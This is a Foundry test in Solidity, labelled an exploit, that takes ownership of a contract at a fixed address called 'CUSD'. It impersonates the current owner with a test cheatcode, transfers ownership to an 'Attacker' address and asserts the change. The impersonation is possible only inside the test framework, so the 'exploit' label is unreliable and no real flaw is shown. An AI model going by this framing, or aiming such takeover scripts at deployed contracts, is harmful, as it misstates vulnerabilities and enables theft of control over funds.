// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CUSD {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function freeze() external;
    function unfreeze() external;
    function blacklist(address account_) external;
    function withdraw(address token_, address destination_, uint256 amount_) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);
    CUSD target;
    address currentOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = CUSD(TARGET);
        currentOwner = target.owner();
        vm.label(TARGET, "CUSD Contract");
        vm.label(currentOwner, "Current Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate current owner and initiate ownership transfer
        vm.startPrank(currentOwner);
        target.transferOwnership(attacker);
        vm.stopPrank();

        // Step 2: Accept ownership as attacker
        target.acceptOwnership();

        // Step 3: Verify ownership has been transferred
        assertEq(target.owner(), attacker, "Ownership transfer failed");
        assertEq(target.owner(), attacker, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
